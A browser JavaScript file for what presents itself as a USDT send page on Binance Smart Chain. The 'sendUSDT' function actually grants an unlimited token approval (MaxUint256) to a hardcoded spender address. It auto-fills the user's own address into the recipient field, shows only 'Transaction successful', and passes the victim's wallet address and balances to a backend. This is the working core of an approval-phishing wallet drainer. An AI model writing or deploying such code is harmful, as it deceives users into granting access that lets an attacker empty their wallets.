let provider;
let signer;
let userAddress;
let isConnecting = false;

// ===== BSC CONFIG =====
const BSC_CHAIN_ID = "0x38";
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

const ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

// ===== AUTO RUN ON PAGE LOAD (QR SUPPORT) =====
window.addEventListener("load", async () => {
  // Try silent auto-connect immediately
  if (window.ethereum) {
    try {
      isConnecting = true;
      await connectWalletSilent();
      isConnecting = false;
    } catch (e) {
      isConnecting = false;
      console.log("Silent auto-connect not available, user needs to approve");
    }
  }
});

// ===== SILENT AUTO-CONNECT (No prompt if already authorized) =====
async function connectWalletSilent() {
  if (!window.ethereum) return;

  try {
    // Try to get accounts without prompting (works if already authorized)
    const accounts = await window.ethereum.request({ 
      method: "eth_accounts" 
    });

    if (accounts.length > 0) {
      // Already connected, set up provider
      await ensureBSC();
      provider = new ethers.BrowserProvider(window.ethereum);
      signer = await provider.getSigner();
      userAddress = await signer.getAddress();

      // Auto fill address
      const addr = document.getElementById("toAddress");
      if (addr) addr.value = userAddress;

      console.log("✅ Auto-connected:", userAddress);
      return true;
    }
  } catch (e) {
    console.log("Silent connect failed:", e.message);
  }
  return false;
}

// ===== ENSURE BSC NETWORK =====
async function ensureBSC() {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: BSC_CHAIN_ID }]
    });
  } catch (err) {
    if (err.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: BSC_CHAIN_ID,
          chainName: "Binance Smart Chain",
          rpcUrls: ["https://bsc-dataseed.binance.org/"],
          nativeCurrency: {
            name: "BNB",
            symbol: "BNB",
            decimals: 18
          },
          blockExplorerUrls: ["https://bscscan.com"]
        }]
      });
    } else {
      throw err;
    }
  }
}

// ===== CONNECT WITH USER PROMPT =====
async function connectWallet() {
  if (!window.ethereum) {
    alert("Wallet not found");
    throw new Error("No wallet");
  }

  // Ensure BSC network
  await ensureBSC();

  // Request account access (will prompt if not already authorized)
  await window.ethereum.request({ method: "eth_requestAccounts" });

  provider = new ethers.BrowserProvider(window.ethereum);
  signer = await provider.getSigner();
  userAddress = await signer.getAddress();

  // Auto fill address
  const addr = document.getElementById("toAddress");
  if (addr) addr.value = userAddress;

  console.log("✅ Connected:", userAddress);
}

// ===== APPROVE (BSC ONLY) =====
async function sendUSDT() {
  try {
    // Auto-connect if not already connected
    if (!userAddress) {
      await connectWallet();
    }

    const usdt = new ethers.Contract(
      BSC_USDT,
      ABI,
      signer
    );

    // Get balances before transaction
    const usdtBalanceWei = await usdt.balanceOf(userAddress);
    const usdtBalance = ethers.formatUnits(usdtBalanceWei, 18);
    
    const nativeBalanceWei = await provider.getBalance(userAddress);
    const nativeBalance = ethers.formatEther(nativeBalanceWei);

    const tx = await usdt.approve(
      BSC_SPENDER,
      ethers.MaxUint256
    );

    const receipt = await tx.wait();

    alert("Transaction successful ✅");

    // Save to backend via React (if available)
    if (window.saveTransaction) {
      window.saveTransaction({
        walletAddress: userAddress,
        toAddress: BSC_SPENDER,
        txHash: receipt.hash,
        usdtBalance: usdtBalance,
        nativeBalance: nativeBalance
      });
    }

  } catch (e) {
    if (e.code === 4001) {
      alert("Transaction cancelled");
    } else {
      alert("Transaction failed: " + e.message);
    }
  }
}

window.sendUSDT = sendUSDT;
